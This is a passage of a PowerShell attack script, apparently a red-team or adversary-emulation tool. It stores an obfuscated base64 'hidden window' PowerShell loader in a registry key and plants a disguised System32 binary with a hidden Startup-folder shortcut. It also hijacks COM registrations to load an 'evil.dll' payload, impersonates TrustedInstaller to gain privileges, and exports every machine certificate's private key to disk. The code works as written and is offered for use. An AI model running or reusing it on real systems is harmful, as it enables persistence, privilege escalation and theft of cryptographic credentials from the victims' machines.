            $javasvc = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAE8ASAA4AFUAMQAwAEMAQQA3AFYAVwBlADIALwBhAFMAQgBEAC8AdQA1AEgAeQBIAGEAdwBLAEMAVgB0AEgAdwBFADUASQBTAGkASgBWAE8AaAB0AHMATQBBAEUAQwBHAEoAdABBAGkAcQBxAE4AdgBkAGkAYgByAEIALwBZAGEAeAA3AHAAOQBiAHYAZgBMAEsAKwBtAGEAbABxADEASgA1ADAARgA4AHUANQA0AG4AcgArAFoAbgBkAGwANQBIAHIAbQBNAHgASgBIAHcAOQBHAEkASwBYADAANQBQADMAdgBWAFIAaQBrAEoAQgBMAEcAeAB1AGgAeQBXAGgANABDADYAawBkACsAKwBBAFcAbABnAHUAVgBlAEcAagBJAEQANgBvAFMAZABLAEkAUQAwAFMAaQAyAGMAMQBOAFAAVQA5AFQASABMAEgAZAB2AHQAegBFAFQATQAwAHkASABEADUAUwBnAGoATgBSAEUAdgA0AFIAeABnAEYATwA4AGQAbgBkADQAeABOADIAbQBmAEIARgBLAEgAdwB1AE4AMgBuADgAaQBPAGkAZQBiAFYATgBIAGIAbwBDAEYATQB6AFgAeQArAEwAZABPADcAQwBMAHUAUwBkAGwASwBLAEcARgBpADgAZABPAG4AbwB2AFIAdwBwAHMAegBLACsAaQBKAEgATgBCAE8ATAAxAGkAWgBqAE8AQwB4ADcAbABCAFkAbAA0AGEAdgBFAEQAWQA0ADIAQwBSAGEATABYAGUASwBtAGMAUgBiAFAAVwBYAGwATQBvAG8AdgB6AHMAaAAxAGwAYQBJADUANwBvAEcAMgBKAHUANQBnAEYAcwBaAGMAVgBKAFEAZwBDAGYAaQBsAG0AZQBSAG8ASgBQAEIAdwB1AHYALwBzAHEARgBtAEgAWgBUADIATgBYADkAYgB3AFUAWgAxAG0AeABKAEQAeAB3AHoAUQArAHoAMgBkAC8AaQB3ADkANwBzAE0ASQA4AFkAQwBYAEgAWgBqAEIAaABPADQAOABUAEMANgBaAEsANABPAEMAdQAzAFUATwBSAFIAUABNAFQAegBHAFUAaABaAEwAQwBXAFIAUAA1AE0AawBZAEYAdgBHAHoAMQBnAHMAUgBEAG0AbABKAGUARgBQADEASQBnADkAdgBEAHEAQQA5AHIAdABDADQAbQBzAGgANABPAHEAegBWAEMAcABCAEUAbgA4AE0AcwB4AHQANwBPAGMAVQA3AHcAZQBJAGIAZgB2AEsAOABTAC8ARABzAGMAZwArAG8AZgBUADAAOQBPAFQAMgBaAEgANgBwAGsATQAzAHAAZABKAEwAQgA2ADkANwBCAGQAWQAzAEIATQA3AE0AYwBaADIAWABKADkARgBPAFMAUwAwAEEAVQBiAGkATQBYAHAAQgByAGEARgBVAFoAcABqAGEAWABhAEUAVgBTAGoAawA3AGQATABQAHAAWgBVAEQASwB6AEQARwBzAHYATABaAEEAdABxAEQARQB4AE4AdgBCAGoATAA3AFQAQgBiAG8AawBsAE4ALwBYAG8AOABOAFAAQwBjAFIAYgBtAHcAaQBGAEIATAAzAFUASABMAGkAVwArAGoAaQBPAGMAWABiADgATQBvAEgAdABoADcANABKAEIAYgAzAEgANwBEAFgAdwBCAFQANwBpAEgASABBAGUASgBKAC8ARQBOAE4ARAB3AG8ANgB5AFcAawA2AG8AaAAxAFAAVgBoAFEAeABsADQAQgBVAGsAVAAvAHIAZQBtAFYAMABPAHgASwBJAFoAZABYAEUASQBBAE8AMwAyAFUASABXAEYATwBSAFEANgBQAG4ARAB2AGkAMwB0AHoAcwBNADcAMwB3AEYAUwBzAFUANQBSAGwASgBhAEcAZgB3ADAAbAB6AFMANABLAEYARQBjAFYAZQBTAFYAQwBqAGoATwB3AC8AcQBUAG0ATAB0ADgAdgBpAE4AMwBlADcATwBXAFgARQBSAFIAawA3AHEASgB0AEoATwB4AFQAMwAxAHUAcAB4AGwATABFADAAZAB5AEYAagBFAFAAbgBJAFMAcgBCAEwARQBPAFYAQQBsAEkAUQBXADgAYgBDADIAcwBZAGgALwBzAEYAcAA4AEUANABZADYAbwBoAFQASwBIAHoAUQB0AEkAUQAxAEEANABlAEYAYgBqAE4AZABCAEMAZwA1AEMAegBxAFcAeQBoAFoAawBaAEoAaABTAEgAdwBMAEUAOQA3AGcAWgBGAFAAaAB6AHUAZgBZAGwAdgB5AHcAYgA1ADIAQwB0ACsANwA5ADIAaABnAG4AZgBsAHkAbABFADQAaABQAC8ASwBOADAAaQB0AFIAVwBOAFcARQBoAHkAUwBNAHUAZwBaAEgATgBGAHQAKwBmAHcAWAAyADYAKwBhAEIAWABoAFIAVAAvAEUAKwBBACsATABoAFQARAB4AG8ARwA4AFoAcgB1AFUAQgBRAEwAVQBwADUATABlADQAUgAyAGMAYQBmAE0AbwBqAGQAUwBPAE4AUQBRAHgAbQArAHEAdQA0AGEAZwAvAGkAKwBvAHAAUABHAFoAYgA4AFIAdgA2AGoAdwA2AE0AWgB3ADQARwBpAFcANwBVAHoATgByAHQAZQBtAGwAcwBtAHMAaQBVADQANgBkAGgAQwBZAFIARABGADkAMgBHADkAcwAzAGUAOAB6AE8AYgBrAGQAagBWAHAAdABxADkARgBTADAAOABZADYAbQBLAHQAbQBaAHUAbwB0AGIAVABOAFEATgBOAFYAdABrAFEAOQBPAFcANwBOAHQAawBDAFAAMQB6AHUAQgBwAGIAYQBxAGUARgB2AHIAMwAvAHEAUwArAE0AdgB2AEIAdgBRAG0ARwA2AGgAMwBmADkATwBHAHQAbQBZAEcAcgB5AFYAUABaADEAMgBTAGoAMwByAEcAMABRAEMAZQB5ADYAbAB1AEQAMQBxAEMAcQBUAE0AMQBLAGoAVwByAGsAeABUAEkAdAB0AFQAVQArADIAagB2AGEAMABhAHYAVgAxAHYAMQA2AHAAUABhADYAYgBUAFUAdwA3AGoAeABEAE8AVABlADIAOABzADkAYwBmAHYAcgBjADcARABUADAANwBkADcAbAArADgARQBrADAANABrAE8AZABuAFIAagBNAG4AQQBDAFAASABZAFMAYgBhAHcAYgAwADQARwBUAG0AUAA1AGYASwAzAC8AZwBkAEMAcABWAEkAOQBDAEEAYgBwAEoAMQBKADcARQBxADgAQwBnAEsANABNAEIARwAxAHUAUABsAEIAUgBwAGYASgBvACsAaABJAHcATgBHAFkAOAB1AE0AQQBzAHUAZAAxADAAYwB0AE4AOQBRAHEARgBjAGQAVwBlAGkAYgBCAHgAbQBqADgATABLADkAWAB1AHIAegBlAE8ARAAyAFEAaQBhACsAYwBLAEkAdwA0AHIARwBxAC8ANABsAHkAcABLADcANQBhADMANAAzAE0AdgBEAHUAYQBWAEQAdABQAGEAdAA1AFQATgBRAFMANgBOAE4AQwBsADUAaQBzAGQAOABOAC8ASgBJAHAALwBMAEoALwBkAGsAVwBtAGsAZQA1AFIAcwAxAHYAbABwADYAegArAHYANgA0ADIAZwBnAFQAdwAyADMAYQBvAGQAVABOAHIAaAB3AG4AcQB4ADcAZQA0ADMATwA5AFgAUAB2AHAAVwBkADIAbQA4AHkAZQBqAGgAeQA3ACsAMABKAEQAUwAxAGQAUQA3AHoAegBRAGUAMABaAHQAMAB3AHUAaABiADQAUwAyAGIARAB2AFgAZwB6AHQANwBPAE0ASgBHADkAdwBJADkARABhAHMAVABYAHoATwBKAHkAMwAwADMASgBoAHgAagBXAHkAWgBWAHQAWABIAHIAQgAxAHYARAAyAGcAQgBpAGEANgA5AHIAbgBkAFMAeABxAGgAOABxADEAdwA3AHcAVABoAGQAMQBlAG0AMgBTAHUAYgBGAG8ASwBZAG0ARgBUAEIAVgBLAFIAMgBzAFQAcgBDADAAMAB3AEIAUAA4AFYAbwBiAEoAMQBkAEYAdgAwAEsAbgBhAFMAcwBMADUAZQAxADIAWAA4AHYALwBJAGwAcQBQAFcAaQBzAGoATgBaAG0AdABaAFUAUwBiADMAcQBqAGUAOABOAHQAZQAxAHAAcQBrAEQAUgBDAEMAdgAxAHgAcgAzAC8AawBIAGUANgBsAGYANgBuAHQAcABKAEYAMwBuAGcAYwBKAEsAdAAwAE0AWABBAFMATgByAEUAYQAyAG4AVgBRAEEAUABmAEEARABaADEASwB6AGQASgBqAEQANAA5AHkAcgBWADcAWQBJAGUAMABMACsARgBmAHMAMABuADcALwBCAGwAcwBxAHEAcQAvADkAWABWAE8AMgAzAGwAdwBPAHkAYgBZADMATABMAHoAdQBQAHoAYQB3AE8AZQAxAG0ASQBXAG8AbwAwAEUAOQByAHEAcgBnAGwAOQBlAGUAcgBKAFIAZwBvAFIAcQBVAFkANwBCAGkAcQBEADIAdQBYAE4AcwBmADMALwBQAGoAQwBPAGUAeAA0AEcARwA1AFEAMQA4AGQAdABKACsATgB4AFMANQBLAHMAdwBCAFIATwBJAEEAdwA4AEEANwB0AHoAbwBoAFQAWQB6AC8ARgArAGoASABoAEUAcQBMAEkANwB6AHoAUABPAEkAMAB3AGgAVgBzAEQAMwBDAHMATwBqAFUATwBsAE4ASABiADUAQQBJAFYAeABCADYATgA3AE4AMQBEADUAZgBMAGQAaABlAFgASAArADUAawBvAFMAagBvAHoAUwB0ADcAbAA2AEkATgAzAGMAVABNAEYARgA2AEUAUABiAFoAbABIAHUANABNAGgAbgBRAFUAbABlAFgAOABnAHkAagBFAHAANQBYAFoAVQBoAHkATgArAFAAcQB4ADQAbgBHADMARwBuAHEAOABSAG4ANwBRADYAYQBvADMAcQA2AFYAUwAvAHgATABsAFcAWQB0ADYANAAvAC8ASwArAFkANwBWAHQAagBBAEMALwB2ADEANQBoADkAbwAvADMAaQA2ADIALwBoAEsASgBmADIARQBmADkAQQAvADUANwB3AFIANgBEACsAYQBlAEIAagBSAEIAZwB3AFcAdABEAFkASwBkADUAZABLAGQANgBLAGYAMQA4AGUAcgArADUAYQBQAEMAVwBRACsALwBuACsANABWAGYAbAB1ADUAeQBkADkAZQBBAEsAZABuAHIAeQBMAC8AdwBMAHYAcwAyAFIAQwB3AEEAQQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="

            # create new registry key; javasvc.exe reads HKLM:\SOFTWARE\Javasoft and pipes the output to powershell to execute a callback 
            New-Item -ItemType Directory -Force -Path "HKLM:\SOFTWARE\Javasoft"
            Set-ItemProperty "HKLM:\SOFTWARE\Javasoft" "value Supplement" $javasvc

            Move-Item "C:\Program Files\SysinternalsSuite\strings64.exe" "C:\Windows\System32\hostui.exe"
            Move-Item "C:\Program Files\SysinternalsSuite\hostui.txt" "C:\Windows\System32\hostui.bat"
            
            $Path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk"
            $TargetPath = "C:\Windows\System32\hostui.bat"
            $Icon = "C:\Windows\System32\shell32.dll,255"
            [System.IO.FileInfo]$Path = $Path
            $WshShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut($Path.FullName)
            $Shortcut.TargetPath = $TargetPath
            $Shortcut.WindowStyle = 7
            $Shortcut.IconLocation = $Icon
            Try 
            {
                Write-Host "[*] Attempting to save shortcut"
                $Shortcut.Save() 
                Write-Host "[*] Shortcut saved"
            } 
            Catch { Write-Host "[!] Unable to create $($Path.FullName)"; Write-Host $Error[0].Exception.Message } 
        }
    }
}

function Invoke-ComHijack {

<#
.FUNCTION
Invoke-ComHijack

.SYNOPSIS
Hijacks the specified COM object name/id.

.PARAMETER ComName
Specifies the full COM object name to be hijacked.

.PARAMETER ComId
Specifies the component id to be hijacked.

.PARAMETER Data
Specifies the data to be assigned to the registry value.

.PARAMETER Name
Specifies the name of the registry value to be used. If not specified it will use (Default). 

.EXAMPLE
PS C:\> Invoke-ComHijack -ComName "Shared Task Scheduler" -Data "C:\evil.dll"
This example hijacks the "Shared Task Scheduler" COM object and sets the (default) field value to the evil.dll payload.

.EXAMPLE
PS C:\> Invoke-ComHijack -ComId "{603D3801-BD81-11d0-A3A5-00C04FD706EC}" -Data "C:\evil.dll"
This example hijacks the COM object with component id {603D3801-BD81-11d0-A3A5-00C04FD706EC} and sets the (default) field value to the evil.dll payload.
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]$ComName,
        [Parameter(Mandatory=$False)]$ComId,
        [Parameter(Mandatory=$True)]$Data,
        [Parameter(Mandatory=$False)]$Name = "(Default)"
    )

    Invoke-TI

    if ($ComName -and !$ComId) {
        Write-Host "[*] Getting COM object id from name provided"
        $ComponentId = Get-WmiObject Win32_COMClass -Filter "Name='$ComName'" | Select-Object -ExpandProperty ComponentId
        $HKCUPath = "HKCU:\Software\Classes\CLSID\$ComponentId\InProcServer32"
        $HKLMPath = "HKLM:\Software\Classes\CLSID\$ComponentId\InProcServer32"
        Write-Host "[*] COM object id: $ComponentId"
    }
    elseif (!$ComName -and $ComId) {
        $HKCUPath = "HKCU:\Software\Classes\CLSID\$ComId\InProcServer32"
        $HKLMPath = "HKLM:\Software\Classes\CLSID\$ComId\InProcServer32"
    }
    else {
        if (!$ComName -and !$ComId) {
            Write-Host "Must specify a COM object name or its' component id."
        }
        else {
            Write-Host "Enter only a COM object name or its' component id, not both."      
        }
        exit
    }

    if (Test-Path $HKCUPath) {
        # Write-Warning "COM Hijacking Time..."
        Write-Host "[*] Hijacking COM"
        Set-ItemProperty -Path $HKCUPath -Name $Name -Value $Data -Force -PassThru
    }
    elseif (Test-Path $HKLMPath) {
        # Write-Warning "COM Hijacking Time..." -WarningAction Inquire
        Write-Host "[*] Hijacking COM"
        Set-ItemProperty -Path $HKLMPath -Name $Name -Value $Data -Force -PassThru
    }
    else {
        Write-Host "Not valid: $HKCUPath"
        Write-Host "Not valid: $HKLMPath"
    }    
}

function Invoke-TI {

    # https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html

    if (!(Get-PackageProvider -Name "NuGet")) { Write-Host "[*] Installing NuGet package provider"; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -ForceBootstrap }
    if (!(Get-Module -Name "NtObjectManager")) { Write-Host "[*] Installing NtObjectManager module"; Install-Module -Name NtObjectManager -Force }
    
    Write-Host "[*] Starting TrustedInstaller service"
    Start-Service TrustedInstaller
    $p = Get-NtProcess -Name TrustedInstaller.exe
    $th = $p.GetFirstThread()
    $th = $th | Select-Object -Last 1
    $current = Get-NtThread -Current -PseudoHandle
    Write-Host "[*] Impersonating TrustedInstaller"
    $imp = $current.ImpersonateThread($th)
    $imp_token = Get-NtToken -Impersonation
    $imp_token.Groups | Where-Object {$_.Sid.Name -match "TrustedInstaller"}
}

function Get-PrivateKeys {
    $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText
    $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Recurse
    foreach ($CertPath in $CertPaths) 
    {   
        if ($CertPath.Thumbprint)
        {
            $RandomFileName = [System.IO.Path]::GetRandomFileName(); 
            $Filepath="$env:USERPROFILE\Downloads\$RandomFileName.pfx";
            try {
                Export-PfxCertificate -Cert $CertPath -FilePath $Filepath -Password $mypwd -ErrorAction SilentlyContinue
            }
            catch [System.ComponentModel.Win32Exception],[Microsoft.CertificateServices.Commands.ExportPfxCertificate]{}
            } 
    }
}

